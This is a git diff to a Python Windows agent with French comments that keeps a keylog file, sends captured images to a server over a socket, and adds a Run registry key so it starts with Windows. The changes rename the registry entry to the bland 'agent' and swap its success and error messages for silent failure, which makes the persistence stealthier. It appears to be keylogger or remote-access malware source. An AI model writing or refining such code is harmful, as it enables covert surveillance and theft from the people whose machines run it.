@@ -9,7 +9,7 @@ import cv2
 import sys
 import winreg as reg
 
-ip_address = '172.20.10.3'
+ip_address = '127.0.0.1'
 port_number = 1234
 keylog_file = "keylog.txt"
 
@@ -75,10 +75,9 @@ def send_image_to_server(cs, image_bytes):
 
     cs.sendall(image_bytes)
 
-
 def add_persistence():
     """
-    Ajoute une entrée au registre de Windows pour lancer automatiquement 'python agent.py' au démarrage.
+    Ajoute une entrée au registre de Windows pour lancer automatiquement le script au démarrage de Windows.
     """
     try:
         python_path = sys.executable
@@ -92,12 +91,10 @@ def add_persistence():
         key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
 
         reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_WRITE)
-        reg.SetValueEx(reg_key, "MonScriptAgent", 0, reg.REG_SZ, command)
+        reg.SetValueEx(reg_key, "agent", 0, reg.REG_SZ, command)
         reg.CloseKey(reg_key)
-
-        print("[INFO] Script ajouté au démarrage de Windows.")
     except Exception as e:
-        print(f"[ERREUR] Impossible d'ajouter le script au démarrage : {e}")
+        pass
 
 def connect_to_server():
     """
